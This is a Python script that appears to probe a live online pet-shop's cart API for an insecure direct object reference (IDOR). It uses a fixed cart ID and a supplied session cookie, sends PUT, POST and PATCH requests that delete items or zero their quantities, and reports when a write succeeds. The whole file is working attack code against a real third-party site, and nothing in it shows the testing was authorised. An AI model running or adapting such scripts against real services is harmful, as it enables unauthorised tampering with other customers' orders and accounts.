#!/usr/bin/env python3
"""
Test full cart update - modify entire cart structure
"""

import requests
import json
import sys
import copy

BASE_URL = "https://www.zooplus.de"
CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"

SESSION_COOKIE = sys.argv[1] if len(sys.argv) > 1 else None

if not SESSION_COOKIE:
    print("[!] Usage: python3 test_cart_full_update.py <session_cookie>")
    sys.exit(1)

headers = {
    "Cookie": SESSION_COOKIE,
    "Accept": "application/json",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Referer": "https://www.zooplus.de/warenkorb",
    "Origin": "https://www.zooplus.de"
}

print(f"[*] Testing full cart update")
print()

# Get current cart
print("[*] Step 1: Get current cart")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code != 200:
    print(f"[!] Failed: {r.status_code}")
    sys.exit(1)

cart = r.json()
before_count = len(cart.get("articles", []))
before_total = cart.get("summary", {}).get("grandTotal", 0)

print(f"[+] Cart before: {before_count} items, {before_total} EUR")
print(f"[+] Articles: {[a.get('id') for a in cart.get('articles', [])]}")
print()

# Test 1: Remove one article by modifying articles array
print("[*] Step 2: Test 1 - Remove article by updating articles array")
cart_modified = copy.deepcopy(cart)
cart_modified["articles"] = cart_modified["articles"][1:]  # Remove first article

print(f"[*] PUT /checkout/api/cart-api/v2/cart/{CART_UUID}")
print(f"    Modified articles count: {len(cart_modified['articles'])}")
try:
    r = requests.put(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", 
                     headers=headers, json=cart_modified, timeout=10)
    print(f"    HTTP {r.status_code}")
    if r.status_code in [200, 204]:
        print(f"    [!!!] SUCCESS!")
        print(f"    Response: {r.text[:300]}")
    elif r.status_code == 400:
        print(f"    [!] Bad Request: {r.text[:200]}")
    else:
        print(f"    Response: {r.text[:200]}")
except Exception as e:
    print(f"    Error: {e}")

# Test 2: Update quantity to 0
print()
print("[*] Step 3: Test 2 - Set quantity to 0 for first article")
cart_modified2 = copy.deepcopy(cart)
if cart_modified2["articles"]:
    cart_modified2["articles"][0]["quantity"] = 0

print(f"[*] PUT /checkout/api/cart-api/v2/cart/{CART_UUID}")
try:
    r = requests.put(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", 
                     headers=headers, json=cart_modified2, timeout=10)
    print(f"    HTTP {r.status_code}")
    if r.status_code in [200, 204]:
        print(f"    [!!!] SUCCESS!")
        print(f"    Response: {r.text[:300]}")
    elif r.status_code == 400:
        print(f"    [!] Bad Request: {r.text[:200]}")
    else:
        print(f"    Response: {r.text[:200]}")
except Exception as e:
    print(f"    Error: {e}")

# Test 3: POST with full cart
print()
print("[*] Step 4: Test 3 - POST full cart update")
cart_modified3 = copy.deepcopy(cart)
cart_modified3["articles"] = cart_modified3["articles"][1:]

print(f"[*] POST /checkout/api/cart-api/v2/cart/{CART_UUID}")
try:
    r = requests.post(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", 
                      headers=headers, json=cart_modified3, timeout=10)
    print(f"    HTTP {r.status_code}")
    if r.status_code in [200, 204]:
        print(f"    [!!!] SUCCESS!")
        print(f"    Response: {r.text[:300]}")
    elif r.status_code == 400:
        print(f"    [!] Bad Request: {r.text[:200]}")
    else:
        print(f"    Response: {r.text[:200]}")
except Exception as e:
    print(f"    Error: {e}")

# Test 4: PATCH
print()
print("[*] Step 5: Test 4 - PATCH cart")
cart_patch = {"articles": [{"id": cart["articles"][0]["id"], "quantity": 0}]}

print(f"[*] PATCH /checkout/api/cart-api/v2/cart/{CART_UUID}")
try:
    r = requests.patch(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", 
                       headers=headers, json=cart_patch, timeout=10)
    print(f"    HTTP {r.status_code}")
    if r.status_code in [200, 204]:
        print(f"    [!!!] SUCCESS!")
        print(f"    Response: {r.text[:300]}")
    elif r.status_code == 400:
        print(f"    [!] Bad Request: {r.text[:200]}")
    else:
        print(f"    Response: {r.text[:200]}")
except Exception as e:
    print(f"    Error: {e}")

# Verify
print()
print("[*] Step 6: Verify cart after modifications")
r = requests.get(f"{BASE_URL}/checkout/api/cart-api/v2/cart/{CART_UUID}", headers=headers)
if r.status_code == 200:
    cart_after = r.json()
    after_count = len(cart_after.get("articles", []))
    after_total = cart_after.get("summary", {}).get("grandTotal", 0)
    
    print(f"[+] Cart after: {after_count} items, {after_total} EUR")
    
    if before_count != after_count or abs(before_total - after_total) > 0.01:
        print()
        print("[!!!] ========================================")
        print("[!!!] CART WAS MODIFIED!")
        print("[!!!] ========================================")
        print(f"[!!!] Before: {before_count} items, {before_total} EUR")
        print(f"[!!!] After:  {after_count} items, {after_total} EUR")
        print()
        print("[!!!] IDOR WRITE ACCESS CONFIRMED!")
    else:
        print("[!] Cart unchanged")

